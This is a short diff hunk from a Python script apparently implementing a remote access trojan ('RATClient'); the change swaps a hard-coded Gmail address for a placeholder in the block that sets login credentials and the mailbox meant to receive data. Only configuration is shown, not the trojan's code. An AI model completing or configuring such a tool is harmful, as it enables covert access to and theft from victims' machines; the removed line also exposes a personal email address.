@@ -269,7 +269,7 @@ class RATClient:
 if __name__ == "__main__":
     USERNAME = "#USERNAME"
     PASSWORD = "#PASSWORD"
-    YOUR_MAIL = "kriyaporu@gmail.com"
+    YOUR_MAIL = "#YOUR MAIL TO RECIEVE EMAILS"
 
     client = RATClient(USERNAME, PASSWORD, YOUR_MAIL)
     client.start()
